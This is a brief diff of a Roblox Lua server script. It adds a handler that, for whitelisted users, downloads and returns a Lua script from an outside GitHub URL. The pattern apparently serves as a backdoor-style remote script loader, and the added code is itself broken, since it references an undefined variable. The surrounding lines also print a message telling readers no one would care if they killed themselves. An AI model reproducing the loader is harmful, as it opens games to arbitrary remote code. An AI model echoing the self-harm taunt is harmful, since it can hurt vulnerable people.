@@ -338,7 +338,9 @@ game:GetService("ReplicatedStorage").givegui.OnServerEvent:Connect(function(play
 end)
 
 game:GetService("ReplicatedStorage"):WaitForChild("gethttp").OnServerInvoke = function(plr)
-	print(plr)
+	if table.find(module.whitelist, player.UserId) then
+		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/thatrandomnoob23/a-random-script/join/localscripts.lua", true)
+	end
 end
 
 print("INSIGHTFUL MESSAGE EXPLAINING WHY NO ONE WOULD CARE IF YOU KILLED YOURSELF")
